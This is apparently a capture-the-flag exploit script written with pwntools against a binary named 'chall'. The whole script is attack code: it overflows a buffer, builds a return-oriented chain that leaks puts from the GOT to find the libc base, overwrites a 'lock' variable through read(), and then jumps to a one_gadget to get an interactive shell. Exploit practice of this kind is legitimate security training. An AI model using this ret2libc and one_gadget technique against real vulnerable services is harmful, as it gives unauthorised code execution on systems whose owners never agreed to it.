#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['terminator','-e']
context.log_level = "debug"

chall = "./chall"
libc = ELF("./libc-2.27.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("localhost", 9002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"A" * 0x78
payload += p64(0x4009b3) # pop rdi; ret
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x4009b3) # pop rdi; ret
payload += p64(0)
payload += p64(0x4009b1) # pop rsi; pop r15; ret
payload += p64(elf.symbols["lock"])
payload += p64(0xDEADBEEF)
payload += p64(elf.plt['read']) # read(0, *lock, hoge)
payload += p64(elf.symbols['main'])


p.recvuntil("Input:")
p.send(payload)
p.recvline()
puts_got = u64(p.recv(6) + b"\x00\x00")
log.info("leak: 0x{:08x}".format(puts_got))
libc_base =  puts_got - libc.symbols['puts']
log.info("libc_base: 0x{:08x}".format(libc_base))

p.sendline(b'\0\0\0\0') # lock = 0

one_gadget = libc_base + 0x4f2c5
payload += p64(one_gadget)
p.recvuntil("Input:")
p.sendline(payload)

p.interactive()
